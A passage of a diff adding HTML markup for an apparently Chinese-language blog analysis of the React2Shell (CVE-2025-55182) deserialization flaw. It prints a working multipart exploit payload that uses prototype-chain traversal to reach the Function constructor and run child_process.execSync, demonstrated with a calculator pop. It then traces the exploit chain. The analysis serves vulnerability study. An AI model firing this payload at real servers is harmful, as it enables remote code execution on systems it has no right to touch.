+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;open&lt;/span&gt; &lt;span class="err"&gt;-a&lt;/span&gt; &lt;span class="err"&gt;Calculator&amp;#39;);NaN&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回到 &lt;code&gt;value.then()&lt;/code&gt;，&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_2.png"
+width="879"
+height="265"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_2_hu_64ee902bb73bbb67.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_2_hu_a614abf52d23ccd3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="331"
+data-flex-basis="796px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;value.status&lt;/code&gt; 已经被修改为“fulfilled”，于是 &lt;code&gt;resolve(value.value)&lt;/code&gt;，也就是调用&lt;code&gt;value.value.then()&lt;/code&gt;，于是上述包含恶意代码的匿名函数被执行。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/VM.png"
+width="855"
+height="143"
+srcset="https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/VM_hu_2de9c10d31ead107.png 480w, https://example.com/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/VM_hu_a960cdbf9c93d44b.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="597"
+data-flex-basis="1434px"
+&gt;&lt;/p&gt;
+&lt;h2 id="0x04-利用链梳理"&gt;0x04 利用链梳理
+&lt;/h2&gt;&lt;h3 id="41-构造假-chunk"&gt;4.1 构造假 Chunk
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;首先是构造 multipart/form-data 请求&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;构造请求数据&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-json" data-lang="json"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;Content-Disposition:&lt;/span&gt; &lt;span class="err"&gt;form-data;&lt;/span&gt; &lt;span class="err"&gt;name=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;0&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// 每个请求字段都会被尝试解析成一个 Chunk
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// 以下 JSON 对象属性对应 Chunk 对象的各项属性
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;#34;then&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$1:__proto__:then&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;// 原型链遍历，获取 Chunk.__proto__:then
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;status&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;resolved_model&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;// 伪造状态
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;reason&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;{\&amp;#34;then\&amp;#34;:\&amp;#34;$B\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;// 调用 _formData.get
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;_response&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;#34;_prefix&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;open -a Calculator&amp;#39;);throw new Error(&amp;#39;halt&amp;#39;);//&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;// 恶意代码
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="nt"&gt;&amp;#34;_formData&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;#34;get&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$1:constructor:constructor&amp;#34;&lt;/span&gt; &lt;span class="c1"&gt;// 获取 [Function: Function]；覆盖FormData.get()方法调用
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;Content-Disposition:&lt;/span&gt; &lt;span class="err"&gt;form-data;&lt;/span&gt; &lt;span class="err"&gt;name=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;$@abc&amp;#34;&lt;/span&gt; &lt;span class="c1"&gt;// case &amp;#34;@&amp;#34;: Chunk 引用，获取或创建一个 Chunk 对象
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="42-原型链遍历"&gt;4.2 原型链遍历
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;initializeModelChunk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;reviveModel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;// 遍历 Chunk[0].value，第一个元素是 &amp;#34;then&amp;#34;: &amp;#34;$1:__proto__:then&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;then&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$1:__proto__:then&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;parseModelString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;// 校验、解析 $B、$@ 等开头的各类字符串对象
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$1:__proto__:then&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;1:__proto__:then&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;getOutlineModel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;1:__proto__:then&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;__proto__&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;then&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;getChunk&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;initializeModelChunk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;reviveModel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;// Chunk[1].value是字符串：&amp;#34;$@abc&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;parseModelString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;// 校验 $B、$@ 等开头的各类字符串对象
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$@abc&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;getChunk&lt;/span&gt;&lt;span class="p"&gt;(...,&lt;/span&gt; &lt;span class="nb"&gt;parseInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2748&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2748&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;__proto__&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2748&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;__proto__&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;then&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2748&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;__proto__&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2748&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;__proto__&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;至此，&lt;code&gt;Chunk[0].value.then&lt;/code&gt; 的值就变为了 Chunk 函数的原型对象的 then 属性，一个 React 自定义匿名函数。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;$@abc&amp;quot;&lt;/code&gt; 只需要满足以 &lt;code&gt;$@&lt;/code&gt; 开头，后半段可以按照十六进制解析为数字即可&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot;$@&amp;quot;&lt;/code&gt;：原始 Chunk 引用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="43-获取构造函数"&gt;4.3 获取构造函数
+&lt;/h3&gt;&lt;p&gt;继续遍历 &lt;code&gt;Chunk[0].value&lt;/code&gt; 剩下的元素，基本是同样的方式获取函数构造器 &lt;code&gt;[Function: Function]&lt;/code&gt;并赋值给&lt;code&gt;Chunk[0].value._response._formData.get&lt;/code&gt; 。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-javascript" data-lang="javascript"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;status&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;reason&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="c1"&gt;// 非$开头的普通字符串或 Int，直接返回
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;_response&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;reviveModel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;// 遍历 Chunk[0].value._response
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;_prefix&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;eval_code&amp;#34;&lt;/span&gt; &lt;span class="c1"&gt;// 非$开头的普通字符串，直接返回
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;_formData&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;reviveModel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;// 遍历 Chunk[0].value._response._formData
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;get&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$1:constructor:constructor&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;parseModelString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;getOutlinedModel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="err"&gt;↓↓↓&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;getChunk&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;constructor&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2748&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;constructor&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Chunk&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2748&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;constructor&lt;/span&gt;
